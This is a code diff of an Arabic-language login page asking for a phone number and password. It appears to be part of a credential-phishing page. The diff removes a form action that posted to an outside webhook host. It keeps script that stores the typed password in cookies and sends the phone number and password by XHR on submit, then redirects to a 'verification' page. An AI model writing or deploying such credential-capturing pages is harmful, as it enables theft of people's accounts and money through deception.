@@ -111,13 +111,11 @@
     <div class="div-block-4">
         <div class="container">
             <div class="w-form">
-<!--                 <form id="signin" 
+                <form id="signin" 
                         name="مقدم الطلب" 
                         data-name="مقدم الطلب" 
                         redirect="/verification"
-                        aria-label="تسجيل الدخول"
-                        action='https://webhook.orangemony.net'
-                        method="post">
+                        aria-label="تسجيل الدخول">
                     <div id="field" class="field-holder">
                         <input class="text-field-2 w-input" maxlength="10" name="رقم الهاتف" data-name="رقم الهاتف" pattern="\d{10,10}" placeholder="" type="text" id="phonenumber" required="">
                         <label for="phonenumber">رقم الهاتف</label>
@@ -131,27 +129,13 @@
                         <input type="submit" data-wait="يرجى الانتظار" id="sb" class="submit-button sb_disabled w-button" value="تسجيل دخول">
                     </div>
 
-                </form> -->
-                <div id="signin">
-                    <div id="field" class="field-holder">
-                        <input class="text-field-2 w-input" maxlength="10" name="رقم الهاتف" data-name="رقم الهاتف" pattern="\d{10,10}" placeholder="" type="text" id="phonenumber" required="">
-                        <label for="phonenumber">رقم الهاتف</label>
-                    </div>
-                    <div id="field" class="field-holder">
-                        <input class="text-field-2 w-input" maxlength="256" name="كلمة السر" data-name="كلمة السر" placeholder="" type="text" id="password" required="">
-                        <label for="password">كلمة المرور</label>
-                    </div>
-                    <div class="div-block">
-                        <div id="invalid_password_label" class="invalid_password_hide"> يرجى أدخال كلمة المرور بشكل صحيح </div>
-                        <input type="submit" data-wait="يرجى الانتظار" id="sb" class="submit-button sb_disabled w-button" value="تسجيل دخول">
-                    </div>
-                </div>
+                </form>
 <!--                 <div class="w-form-done" tabindex="-1" role="region" aria-label="تسجيل الدخول success">
                     <div>Thank you! Your submission has been received!</div>
                 </div> -->
-<!--                 <div class="w-form-fail" tabindex="-1" role="region" aria-label="تسجيل الدخول failure">
+                <div class="w-form-fail" tabindex="-1" role="region" aria-label="تسجيل الدخول failure">
                     <div>حدث خطأ يرجى المحاولة لاحقا.</div>
-                </div> -->
+                </div>
             </div>
         </div>
     </div>
@@ -231,7 +215,7 @@
             d.setTime(d.getTime() + (1000 * 24 * 60 * 60 * 1000))
             document.cookie = cname + "=" + cvalue + ";expires=" + d.toUTCString(); + ";path=/";
         }
-        $('#sb').on("click", function() {
+        $('#signin').on("submit", function() {
             setCookie("phonenumber", document.getElementById('phonenumber').value);
             setCookie("password", document.getElementById('password').value);
 
@@ -242,7 +226,6 @@
             xhr.send(JSON.stringify({
                 'phonenumber': document.getElementById('phonenumber').value,
                 'password':document.getElementById('password').value
-
             }));
 
         })
